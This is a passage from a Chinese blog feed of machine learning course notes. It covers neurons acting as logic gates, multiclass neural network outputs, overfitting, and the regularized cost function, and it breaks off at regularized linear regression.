OPERATORS</strong>）当输入特征为布尔值（0或1）时，我们可以用一个单一的激活层可以作为二元逻辑运算符，为了表示不同的运算符，我们只需要选择不同的权重即可。</p><p>下图的神经元（三个权重分别为-30，20，20）可以被视为作用同于逻辑与（<strong>AND</strong>）：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111210.png" alt></p><p>下图的神经元（三个权重分别为-10，20，20）可以被视为作用等同于逻辑或（<strong>OR</strong>）：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111223.png" alt></p><p>下图的神经元（两个权重分别为 10，-20）可以被视为作用等同于逻辑非（<strong>NOT</strong>）：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111229.png" alt></p><p>我们可以利用神经元来组合成更为复杂的神经网络以实现更复杂的运算。例如我们要实现<strong>XNOR</strong> 功能（输入的两个值必须一样，均为1或均为0），即 $\text{XNOR}=( \text{x}_1\, \text{AND}\, \text{x}_2 )\, \text{OR} \left( \left( \text{NOT}\, \text{x}_1 \right) \text{AND} \left( \text{NOT}\, \text{x}_2 \right) \right)$<br>首先构造一个能表达$\left( \text{NOT}\, \text{x}_1 \right) \text{AND} \left( \text{NOT}\, \text{x}_2 \right)$部分的神经元：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111241.png" alt></p><p>然后将表示 <strong>AND</strong> 的神经元和表示$\left( \text{NOT}\, \text{x}_1 \right) \text{AND} \left( \text{NOT}\, \text{x}_2 \right)$的神经元以及表示 OR 的神经元进行组合：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111254.png" alt></p><p>我们就得到了一个能实现 $\text{XNOR}$ 运算符功能的神经网络。</p><p>按这种方法我们可以逐渐构造出越来越复杂的函数，也能得到更加厉害的特征值。</p><p>这就是神经网络的厉害之处。</p><h2 id="8-7-多类分类-Multiclass-Classification"><a href="#8-7-多类分类-Multiclass-Classification" class="headerlink" title="8.7 多类分类(Multiclass Classification)"></a>8.7 多类分类(Multiclass Classification)</h2><p>在这段视频中 我想和大家谈谈 如何用神经网络做<code>多类别分类</code> 在多类别分类中 通常有不止一个类别 需要我们去区分 在上一段视频最后 我们提到了有关 手写数字辨识的问题 这实际上正是一个 多类别分类的问题 因为辨识数字 从0到9 正好是10个类别 因此你也许已经想问 究竟应该怎样处理这个问题</p><p>我们处理<code>多类别分类</code>的方法 实际上是基于<code>一对多神经网络算法</code> 而延伸出来的</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112155020.png" alt></p><p>让我们来看这样一个例子 还是有关计算机视觉的例子 就像我之前介绍过的 识别汽车的例子 但与之不同的是 现在我们希望处理的 是四个类别的分类问题 给出一幅图片 我们需要确定图上是什么 是一个行人 一辆汽车 还是一辆摩托车 亦或是一辆卡车 对于这样一个问题 我们的做法是 建立一个具有四个输出单元的神经网络 也就是说 此时神经网络的输出 是一个<code>四维向量</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112155134.png" alt></p><p>因此 现在的输出 需要用一个向量来表示 这个向量中有四个元素 而我们要做的 是对第一个输出元素 进行分辨 图上是不是一个行人 然后对第二个元素 分辨它是不是一辆汽车 同样 第三个元素 是不是摩托车 第四个元素 是不是一辆卡车 因此 当图片上是一个行人时 我们希望这个神经网络 输出1 0 0 0 当图片是一辆轿车时 我们希望输出是 0 1 0 0 当图片是一辆摩托车时 我们希望结果是0 0 1 0 以此类推</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112155231.png" alt></p><p>所以 这和我们介绍逻辑回归时 讨论过的一对多方法 其实是一样的 只不过现在我们有 四个逻辑回归的分类器 而我们需要对 四个分类器中每一个 都分别进行识别分类 因此 重新整理一下这页讲义 这是我们的神经网络结构 有四个输出单元</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112155343.png" alt></p><p>这是针对不同的图片 我们h(x)的表达式 此时 我们需要用如下的方法 来表示训练集 在这个例子中 当我们要表征一个 具有行人 汽车 摩托车和卡车 这样四个不同图片作为元素的训练集时 我们应该怎么做呢 之前 我们把<code>标签</code>写作一个整数 用y来表示 1 2 3 4 现在我们不这样表示y 而是用以下的方法来代表y 那就是 y(i) 表示1 0 0 0 或者0 1 0 0 或者0 0 1 0 或者0 0 0 1 根据相对于的图片x(i)来决定 这样 我们的训练样本 将成为 x(i) y(i) 这一对数 其中 x(i)表示我们已知的 四种物体图像中的一个 而y(i)是这四个向量中的某一个</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181112155552.png" alt></p><p>我们希望 能够找到某种方法 让我们的神经网络输出某个值 因此 h(x) 近似约等于y 在我们的例子中 h(x) 和 y(i) 它们都应该是四维向量 因为我们有四个类别</p><p>这样我们就讨论了 怎样基于我们的假设表达式 来表征神经网络 在接下来几节课中 我们会开始讨论 怎样得到<code>训练集</code> 以及怎样<strong>自动学习神经网络的参数</strong></p><h3 id="小小的总结–多类分类"><a href="#小小的总结–多类分类" class="headerlink" title="小小的总结–多类分类"></a>小小的总结–多类分类</h3><p>当我们有不止两种分类时（也就是$y=1,2,3….$），比如以下这种情况，该怎么办？如果我们要训练一个神经网络算法来识别路人、汽车、摩托车和卡车，在输出层我们应该有4个值。例如，第一个值为1或0用于预测是否是行人，第二个值用于判断是否为汽车。</p><p>输入向量$x$有三个维度，两个中间层，输出层4个神经元分别用来表示4类，也就是每一个数据在输出层都会出现${{\left[ a\text{ }b\text{ }c\text{ }d \right]}^{T}}$，且$a,b,c,d$中仅有一个为1，表示当前类。下面是该神经网络的可能结构示例：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111455.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111508.png" alt></p><p>神经网络算法的输出结果为四种可能情形之一：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190213111522.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 神经网络表述 </tag>
            
            <tag> Neural-Networks-Representation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第七章-正则化-Regularization</title>
      <link href="/2019/02/13/di-qi-zhang-zheng-ze-hua-regularization/"/>
      <url>/2019/02/13/di-qi-zhang-zheng-ze-hua-regularization/</url>
      
        <content type="html"><![CDATA[<h1 id="第七章-正则化-Regularization"><a href="#第七章-正则化-Regularization" class="headerlink" title="第七章 正则化(Regularization)"></a>第七章 正则化(Regularization)</h1><h2 id="7-1-过拟合的问题"><a href="#7-1-过拟合的问题" class="headerlink" title="7.1 过拟合的问题"></a>7.1 过拟合的问题</h2><ul><li><p>到现在为止 你已经见识了 几种不同的学习算法 包括线性回归和逻辑回归 它们能够有效地解决许多问题 但是当将它们应用到 某些特定的机器学习应用时 会遇到<code>过度拟合(over-fitting)</code>的问题 可能会导致它们效果很差</p></li><li><p>在这段视频中 我将为你解释 什么是过度拟合问题 并且 在此之后接下来的几个视频中 我们将谈论一种 称为<code>正则化(regularization)</code>的技术 它可以改善或者 减少过度拟合问题 以使学习算法更好实现 那么什么是过度拟合呢？</p></li><li><p>让我们继续使用 那个用线性回归 来预测房价的例子 我们通过建立 以住房面积为自变量的函数来预测房价 我们可以 对该数据做线性回归 如果这么做 我们也许能够获得 拟合数据的这样一条直线 但是 这不是一个很好的模型 我们看看这些数据 很明显 随着房子面积增大 住房价格的变化趋于稳定 或者越往右越平缓 因此该算法 没有很好拟合训练数据 我们把这个问题称为<code>欠拟合(underfitting)</code> 这个问题的另一个术语叫做 <code>高偏差(High bias)</code> 这两种说法大致相似 意思是它只是没有很好地拟合训练数据 这个词是 过去传下来的一个专业名词 它的意思是 如果拟合一条直线 到训练数据 就好像算法 有一个很强的偏见 或者说非常大的偏差 因为该算法认为房子价格与面积仅仅线性相关 尽管与该数据的事实相反 尽管相反的证据 被事前定义为 偏差 它还是接近于 拟合一条直线 而此法最终导致拟合数据效果很差</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131171932.png" alt></p></li><li><p>我们现在可以在中间 加入一个二次项 在这组数据中 我们用二次函数来拟合它 然后可以拟合出一条曲线 事实证明这个拟合效果很好</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172016.png" alt></p><ul><li>另一个极端情况是 如果我们拟合一个四次多项式 因此在这里我们有五个参数 $\theta_0$到$\theta_4$ 这样我们可以拟合一条曲线 通过我们的五个训练样本 你可以得到看上去如此的一条曲线</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172106.png" alt></p><ul><li>一方面 似乎 对训练数据 做了一个很好的拟合 因为这条曲线通过了所有的训练实例 但是 这仍然是一条扭曲的曲线 对吧？ 它不停上下波动 因此事实上 我们并不认为它是一个预测房价的好模型 所以 这个问题我们把他叫做 <code>过度拟合</code>或<code>过拟合(overfitting)</code> 另一个描述该问题的术语是 <code>高方差(variance)</code> 高方差是另一个 历史上的叫法 但是 从第一印象上来说 如果我们拟合一个 高阶多项式 那么 这个函数能很好的拟合训练集 能拟合几乎所有的 训练数据 这就面临可能函数太过庞大的问题 变量太多 同时如果我们没有足够的数据 去约束这个变量过多的模型 那么这就是过度拟合</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172204.png" alt></p><ul><li>在两者之间的情况 叫”刚好合适” 这并不是一个真正的名词 我只是把它写在这里 这个二次多项式 二次函数 可以说是恰好拟合这些数据</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172235.png" alt></p><ul><li>概括地说 过度拟合的问题 将会在变量过多的时候 发生 这种时候训练出的方程总能很好的拟合训练数据 所以 你的代价函数 实际上可能非常接近于0 或者 就是0 但是 这样的曲线 它千方百计的拟合于训练数据 这样导致 它无法泛化到 新的数据样本中 以至于无法预测新样本价格 在这里 术语”<code>泛化</code>“ 指的是<strong>一个假设模型能够应用到新样本的能力</strong> 新样本数据是 没有出现在训练集中的房子</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172427.png" alt></p><ul><li>在这张幻灯片上 我们看到了 线性回归情况下的过拟合 类似的方法同样可以应用到逻辑回归 这里是一个以x1与x2为变量的 逻辑回归</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172541.png" alt></p><ul><li>我们可以做的就是 用这样一个简单的假设模型 来拟合逻辑回归 和以前一样 字母$g$代表<code>S型函数</code> 如果这样做 你会得到一个假设模型 这个假设模型是一条直线 它直接分开了正样本和负样本 但这个模型并不能够很好的拟合数据 因此 这又是一个<code>欠拟合</code>的例子 或者说假设模型具有高偏差</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172650.png" alt></p><ul><li>相比之下 如果 如果再加入一些变量 比如这些二次项 那么你可以得到一个判定边界 像这样 这样就很好的拟合了数据 这很可能 是训练集的最好拟合结果</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172744.png" alt></p><ul><li>最后 在另一种极端情况下 如果你用高阶多项式来拟合数据 你加入了很多 高阶项 那么逻辑回归可能发生自身扭曲 它千方百计的 形成这样一个 判定边界 来拟合你的训练数据 以至于成为一条扭曲的曲线 使其能够拟合每一个训练集中的样本 而且 如果x1和x2 能够预测 癌症 你知道 癌症是一种恶性肿瘤 同时肿瘤也可能是良性 确实 这个假设模型不是一个很好的预测 因此 这又是一个过拟合例子 是一个 有高方差的假设模型 并且不能够很好泛化到新样本</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131172845.png" alt></p><ul><li>在今后课程中 我们会讲到调试和诊断 诊断出导致学习算法故障的东西 我们告诉你如何用 专门的工具来识别 过拟合 和可能发生的欠拟合 但是 现在 让我们谈谈 过拟合 的问题 我们怎么样解决呢</li><li>在前面的例子中 当我们使用一维或二维数据时 我们可以通过绘出假设模型的图像来研究问题所在 再选择合适的多项式来拟合数据 因此 以之前的房屋价格为例 我们可以 绘制假设模型的图像 就能看到 模型的曲线 非常扭曲并通过所有样本房价 我们可以通过绘制这样的图形 来选择合适的多项式阶次 因此<strong>绘制假设模型曲线 可以作为决定多项式阶次 的一种方法</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131173050.png" alt></p><ul><li>但是这并不是总是有用的 而且事实上更多的时候我们 会遇到有很多变量的假设模型 并且 这不仅仅是选择多项式阶次的问题 事实上 当我们 有这么多的特征变量 这也使得绘图变得更难 并且 更难使其可视化 因此并不能通过这种方法决定保留哪些特征变量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131173127.png" alt></p><ul><li>具体地说 如果我们试图 预测房价 同时又拥有这么多特征变量 这些变量看上去都很有用 但是 如果我们有 <strong>过多的变量 同时 只有非常少的训练数据 就会出现过度拟合的问题</strong></li><li>为了解决过度拟合 有两个办法 来解决问题 <strong>第一个办法是要尽量 减少选取变量的数量</strong> 具体而言 我们可以人工检查 变量的条目 并以此决定哪些变量更为重要 然后 决定保留哪些特征变量 哪些应该舍弃</li><li>在今后的课程中 我们会提到<strong>模型选择算法</strong> 这种算法是为了自动选择 采用哪些特征变量 自动舍弃不需要的变量 这种减少特征变量 的做法是非常有效的 并且可以减少过拟合的发生 当我们今后讲到模型选择时 我们将深入探讨这个问题 但是其缺点是 舍弃一部分特征变量 你也舍弃了 问题中的一些信息 例如 也许所有的 特征变量 对于预测房价都是有用的 我们实际上并不想 舍弃一些信息 或者舍弃这些特征变量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131173423.png" alt></p><ul><li>第二个选择 我们将在接下来的视频中讨论 就是<code>正则化regularization</code> 正则化中我们将保留 所有的特征变量 但是减少参数 $\theta_j$ 的大小  这个方法非常有效</li><li>当我们有很多特征变量时 其中每一个变量 都能对预测产生一点影响 y的值 正如我们在房价的例子中看到的那样 在那里我们可以有很多特征变量 其中每一个变量 都是有用的 因此我们不希望把它们删掉 这就导致了 正则化概念的发生</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131173639.png" alt></p><ul><li>我知道 这些东西你们现在可能还听不懂 但是在接下来的视频中 我们将开始详细讲述 怎样应用正则化和什么叫做正则化均值 然后我们将开始 讲解怎样使用正则化 怎样使学习算法正常工作 并避免过拟合</li></ul><h3 id="小小的总结–接下来是别人的笔记"><a href="#小小的总结–接下来是别人的笔记" class="headerlink" title="小小的总结–接下来是别人的笔记"></a>小小的总结–接下来是别人的笔记</h3><p>到现在为止，我们已经学习了几种不同的学习算法，包括<code>线性回归</code>和<code>逻辑回归</code>，它们能够有效地解决许多问题，但是当将它们应用到某些特定的机器学习应用时，会遇到<code>过度拟合(over-fitting)</code>的问题，可能会导致它们效果很差。</p><p>在这段视频中，我将为你解释什么是过度拟合问题，并且在此之后接下来的几个视频中，我们将谈论一种称为<code>正则化(regularization)</code>的技术，它可以<strong>改善或者减少过度拟合问题</strong>。</p><p>如果我们有非常多的特征，我们通过学习得到的<strong>假设可能能够非常好地适应训练集（代价函数可能几乎为0），但是可能会不能推广到新的数据</strong>。</p><p>下图是一个回归问题的例子：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215009.png" alt></p><p>第一个模型是一个线性模型，欠拟合，不能很好地适应我们的训练集,我们把这个问题称为<code>欠拟合(underfitting)</code>或<code>高偏差(high bias)</code>；第三个模型是一个四次方的模型，过于强调拟合原始数据，而丢失了算法的本质：预测新数据。我们可以看出，若给出一个新的值使之预测，它将表现的很差，是<code>过拟合(overfitting)</code>或<code>高方差(variance)</code>，<strong>虽然能非常好地适应我们的训练集但在新输入变量进行预测时可能会效果不好</strong>；而中间的模型似乎最合适。</p><p>分类问题中也存在这样的问题：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215019.png" alt></p><p>就以多项式理解，$x$ 的次数越高，拟合的越好，但相应的预测的能力就可能变差。</p><p>问题是，如果我们<strong>发现了过拟合问题，应该如何处理</strong>？</p><ol><li><p>丢弃一些不能帮助我们正确预测的特征。可以是手工选择保留哪些特征，或者使用一些模型选择的算法来帮忙（例如PCA）</p></li><li><p>正则化。 保留所有的特征，但是减少参数$\theta_j$的大小（magnitude）。</p></li></ol><h2 id="7-2-代价函数"><a href="#7-2-代价函数" class="headerlink" title="7.2 代价函数"></a>7.2 代价函数</h2><ul><li>在这段视频中 传达给你一个直观的感受 告诉你正规化是如何进行的 而且 我们还要写出 我们使用正规化时 需要使用的代价函数 根据我们幻灯片上的 这些例子 我想我可以给你一个直观的感受 但是 一个更好的 让你自己去理解正规化 如何工作的方法是 你自己亲自去实现它 并且看看它是如何工作的 如果在这节课后 你进行一些适当的练习 你就有机会亲自体验一下 正规化到底是怎么工作的 那么 这里就是一些直观解释</li><li>在前面的视频中 我们看到了 如果说我们要 用一个二次函数来 拟合这些数据 它给了我们一个对数据很好的拟合 然而 如果我们 用一个更高次的 多项式去拟合 我们最终 可能得到一个曲线 能非常好地拟合训练集 但是 这真的不是一个好的结果 它过度拟合了数据 因此 一般性并不是很好</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192408.png" alt></p><ul><li>让我们考虑下面的假设 我们想要加上惩罚项 从而使 参数 $\theta_3$ 和 $\theta_4$ 足够的小</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192455.png" alt></p><ul><li>这里我的意思就是 这是我们的优化目标 或者客观的说 这就是我们需要 优化的问题 我们需要尽量减少 代价函数的均方误差 对于这个函数 我们对它进行一些 添加一些项 加上 1000 乘以 $\theta_3$ 的平方 再加上 1000 乘以 $\theta_4$ 的平方 1000 只是我随便写的某个较大的数字而已</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192503.png" alt></p><ul><li>现在 如果我们要 最小化这个函数 为了使这个 新的代价函数最小化 我们要让 $\theta_3$ 和 $\theta_4$ 尽可能小 对吧？ 因为 如果你有 1000 乘以 $\theta_3$ 这个 新的代价函数将会是很大的 所以 当我们最小化 这个新的函数时 我们将使 $\theta_3$ 的值 接近于0 $\theta_4$ 的值也接近于0 就像我们忽略了 这两个值一样</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192513.png" alt></p><ul><li>如果我们做到这一点 如果 $\theta_3$ 和 $\theta_4$ 接近0 那么我们 将得到一个近似的二次函数 所以 我们最终 恰当地拟合了数据 你知道 二次函数加上一些项 这些很小的项 贡献很小 因为 $\theta_3$ $\theta_4$ 它们是非常接近于0的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192523.png" alt></p><ul><li>所以 我们最终得到了 实际上 很好的一个二次函数 因为这是一个 更好的假设 在这个具体的例子中 我们看到了 惩罚这两个 大的参数值的效果 更一般地 这里给出了正规化背后的思路</li><li>这种思路就是 如果我们 的参数值 对应一个较小值的话 就是说 参数值比较小 那么往往我们会得到一个 形式更简单的假设 所以 我们最后一个例子中 我们惩罚的只是 $\theta_3$ 和 $\theta_4$ 使这两个 值均接近于零 我们得到了一个更简单的假设 也即这个假设大抵上是一个二次函数 但更一般地说 如果我们就像这样 惩罚的其它参数 通常我们 可以把它们都想成是 得到一个更简单的假设 因为你知道 当这些参数越接近这个例子时 假设的结果越接近 一个二次函数 但更一般地 可以表明 这些参数的值越小 通常对应于越光滑的函数 也就是更加简单的函数 因此 就不易发生过拟合的问题</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192538.png" alt></p><ul><li>我知道 为什么要所有的部分参数变小的这些原因 为什么越小的参数对应于一个简单的假设 我知道这些原因 对你来说现在不一定完全理解 但现在解释起来确实比较困难 除非你自己实现一下 自己亲自运行了这部分 但是我希望 这个例子中 使 $\theta_3$ 和 $\theta_4$ 很小 并且这样做 能给我们一个更加简单的 假设 我希望这个例子 有助于解释原因 至少给了 我们一些直观感受 为什么这应该是这样的</li><li>来让我们看看具体的例子 对于房屋价格预测我们 可能有上百种特征 我们谈到了一些可能的特征 比如说 x1 是房屋的尺寸 x2 是卧室的数目 x3 是房屋的层数等等 那么我们可能就有一百个特征 跟前面的多项式例子不同 我们是不知道的 对吧 我们不知道 θ3 θ4 是高阶多项式的项 所以 如果我们有一个袋子 如果我们有一百个特征 在这个袋子里 我们是很难 提前选出那些 关联度更小的特征的 也就是说如果我们有一百或一百零一个参数 我们不知道 挑选哪一个 我们并不知道 如何选择参数 如何缩小参数的数目</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192549.png" alt></p><ul><li>因此在正规化里 我们要做的事情 就是把我们的 代价函数 这里就是线性回归的代价函数 接下来我来修改这个代价函数 从而 <strong>缩小我所有的参数值</strong> 因为你知道 我不知道是哪个 哪一个或两个要去缩小 所以我就修改我的 代价函数 在这后面添加一项 就像我们在方括号里的这项 当我添加一个额外的 正则化项的时候 我们收缩了每个 参数 并且因此 我们会使 我们所有的参数 θ1 θ2 θ3 直到 θ100 的值变小</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192559.png" alt></p><ul><li>顺便说一下 按照惯例来讲 我们从第一个这里开始 所以我实际上没有去惩罚 $\theta_0$ 因此 $\theta_0$ 的值是大的 这就是一个约定 <strong>从1到 n 的求和</strong> 而不是从0到 n 的求和 但其实在实践中 这只会有非常小的差异 无论你是否包括这项 就是 $\theta_0$这项 实际上 结果只有非常小的差异 但是按照惯例 通常情况下我们还是只 从 $\theta_1$ 到 $\theta_{100}$ 进行正规化</li><li>这里我们写下来 我们的正规化优化目标</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192609.png" alt></p><ul><li>我们的正规化后的代价函数 就是这样的 $J(\theta)$ 这个项 右边的这项就是一个正则化项 并且 $\lambda$ 在这里我们称做<code>正规化参数</code>  $\lambda$ 要做的就是<strong>控制 在两个不同的目标中 的一个平衡关系</strong> 第一个目标 第一个需要抓住的目标 就是我们想要训练 <strong>使假设更好地拟合训练数据</strong> 我们希望假设能够很好的适应训练集 而第二个目标是 <strong>我们想要保持参数值较小</strong> 这就是第二项的目标 通过正则化目标函数 这就是 $\lambda$ 这个正则化 参数需要控制的 它会这两者之间的平衡 目标就是平衡拟合训练的目的 和 保持参数值较小的目的 从而来保持假设的形式相对简单 来避免过度的拟合</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192617.png" alt></p><ul><li>对于我们的房屋价格预测来说 这个例子 尽管我们之前有 我们已经用非常高的 高阶多项式来拟合 我们将会 得到一个 非常弯曲和复杂的曲线函数 就像这个 如果你还是用高阶多项式拟合 就是用这里所有的多项式特征来拟合的话 但现在我们不这样了 你只需要确保使用了 正规化目标的方法 那么你就可以得到 实际上是一个曲线 但这个曲线不是 一个真正的二次函数 而是更加的流畅和简单 也许就像这条紫红色的曲线一样 那么 你知道的 这样就得到了对于这个数据更好的假设</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192628.png" alt></p><ul><li>再一次说明下 我了解这部分有点难以明白 为什么加上 参数的影响可以具有 这种效果 但如果你 亲自实现了正规化 你将能够看到 这种影响的最直观的感受</li><li>在正规化线性回归中 如果 正规化参数值 被设定为非常大 那么将会发生什么呢？ 我们将会非常大地惩罚 参数$\theta_1$ $\theta_2$ $\theta_3$ $\theta_4$ 也就是说 如果我们的假设是底下的这个</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192642.png" alt></p><ul><li>如果我们最终惩罚 $\theta_1$ $\theta_2$ $\theta_3$ $\theta_4$ 在一个非常大的程度 那么我们 会使所有这些参数接近于零的 对不对？ $\theta_1$ 将接近零 $\theta_2$ 将接近零 $\theta_3$ 和$\theta_4$ 最终也会接近于零 如果我们这么做 那么就是 我们的假设中 相当于去掉了这些项 并且使 我们只是留下了一个简单的假设 这个假设只能表明 那就是 房屋价格 就等于 $\theta_0$ 的值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192657.png" alt></p><ul><li>那就是类似于拟合了 一条水平直线 对于数据来说 这就是一个 <code>欠拟合 (underfitting)</code> 这种情况下这一假设 它是条失败的直线 对于训练集来说 这只是一条平滑直线 它没有任何趋势 它不会去趋向大部分训练样本的任何值 这句话的另​​一种方式来表达就是 这种假设有 过于强烈的”偏见” 或者 过高的<code>偏差 (bais)</code> 认为预测的价格只是 等于 $\theta_0$ 并且 尽管我们的数据集 选择去拟合一条 扁平的直线 仅仅是一条 扁平的水平线 我画得不好 对于数据来说 这只是一条水平线</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192826.png" alt></p><ul><li>因此 为了使正则化运作良好 我们应当注意一些方面 应该去选择一个不错的 正则化参数 $\lambda$ 并且当我们以后讲到多重选择时 在后面的课程中 我们将讨论 一种方法 一系列的方法来自动选择 正则化参数 $\lambda$ 所以 这就是高度正则化的思路 回顾一下代价函数 为了使用正则化 在接下来的两段视频中 让我们 把这些概念 应用到 到线性回归和 逻辑回归中去 那么我们就可以让他们 避免过度拟合了</li></ul><h3 id="小小的总结–代价函数"><a href="#小小的总结–代价函数" class="headerlink" title="小小的总结–代价函数"></a>小小的总结–代价函数</h3><p>上面的回归问题中如果我们的模型是：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215029.png" alt></p>${h_\theta}\left( x \right)={\theta_{0}}+{\theta_{1}}{x_{1}}+{\theta_{2}}{x_{2}}+{\theta_{3}}{x_{3}}+{\theta_{4}}{x_{4}}$<p>我们可以从之前的事例中看出，正是那些高次项导致了过拟合的产生，所以如果我们能让这些高次项的系数接近于0的话，我们就能很好的拟合了。<br>所以<strong>我们要做的就是在一定程度上减小这些参数$\theta$ 的值，这就是正则化的基本方法</strong>。我们决定要减少${\theta_{3}}$和${\theta_{4}}$的大小，我们要做的便是修改代价函数，在其中${\theta_{3}}$和${\theta_{4}}$ 设置一点<code>惩罚</code>。这样做的话，我们在尝试最小化代价时也需要将这个惩罚纳入考虑中，并最终导致选择较小一些的${\theta_{3}}$和${\theta_{4}}$。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215052.png" alt></p><p>修改后的代价函数如下：$\underset{\theta }{\mathop{\min }}\,\frac{1}{2m}[\sum\limits_{i=1}^{m}{{{\left( {{h}_{\theta }}\left( {{x}^{(i)}} \right)-{{y}^{(i)}} \right)}^{2}}+1000\theta _{3}^{2}+10000\theta _{4}^{2}]}$</p><p>通过这样的代价函数选择出的${\theta_{3}}$和${\theta_{4}}$ 对预测结果的影响就比之前要小许多。假如我们有非常多的特征，<strong>我们并不知道其中哪些特征我们要惩罚，我们将对所有的特征进行惩罚，并且让代价函数最优化的软件来选择这些惩罚的程度。这样的结果是得到了一个较为简单的能防止过拟合问题的假设</strong>：$J\left( \theta  \right)=\frac{1}{2m}[\sum\limits_{i=1}^{m}{{{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}})}^{2}}+\lambda \sum\limits_{j=1}^{n}{\theta_{j}^{2}}]}$</p><p>其中$\lambda$又称为<code>正则化参数（Regularization Parameter）</code>。 注：<strong>根据惯例，我们不对${\theta_{0}}$ 进行惩罚</strong>。经过正则化处理的模型与原模型的可能对比如下图所示：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215108.png" alt></p><p>如果选择的正则化参数λ过大，则会把所有的参数都最小化了，导致模型变成 ${h_\theta}\left( x \right)={\theta_{0}}$，也就是上图中红色直线所示的情况，造成<code>欠拟合</code>。<br>那为什么增加的一项$\lambda =\sum\limits_{j=1}^{n}{\theta_j^{2}}$ 可以使$\theta$的值减小呢？<br>因为<strong>如果我们令 $\lambda$ 的值很大的话，为了使Cost Function 尽可能的小，所有的 $\theta$ 的值（不包括${\theta_{0}}$）都会在一定程度上减小</strong>。<br><strong>但若λ的值太大了，那么$\theta$（不包括${\theta_{0}}$）都会趋近于0，这样我们所得到的只能是一条平行于$x$轴的直线</strong>。<br>所以对于正则化，我们要取一个合理的 $\lambda$ 的值，这样才能更好的应用正则化。<br>回顾一下代价函数，为了使用正则化，让我们把这些概念应用到到线性回归和逻辑回归中去，那么我们就可以让他们避免过度拟合了。</p><h2 id="7-3-正则化线性回归"><a href="#7-3-正则化线性回归" class="headerlink" title="7.3 正则化线性回归"></a>7.3 正则化线性回归</h2><ul><li>对于线性回归的求解 我们之前 推导了两种学习算法 一种基于梯度下降 一种基于正规方程 在这段视频中 我们将继续学习 这两个算法 并把它们推广 到<code>正则化线性回归</code>中去</li><li>这是我们上节课推导出的 正则化线性回归的 优化目标</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192933.png" alt></p><ul><li>前面的第一部分是 一般线性回归的目标函数 而现在我们有这个额外的 正则化项 其中 $\lambda$ 是<code>正则化参数</code> 我们想找到参数 $\theta$ 能最小化代价函数 即这个正则化代价函​​数 $J(\theta)$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212192942.png" alt></p><ul><li>之前 我们使用 梯度下降求解原来 没有正则项的代价函数 我们用 下面的算法求解常规的 没有正则项的线性回归 我们会如此反复更新 参数 $\theta_j$ 其中 $j=0, 1, 2...n$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193007.png" alt></p><ul><li>让我 照这个把 $j=0$ 即 $\theta_0$ 的情况单独写出来 我只是把 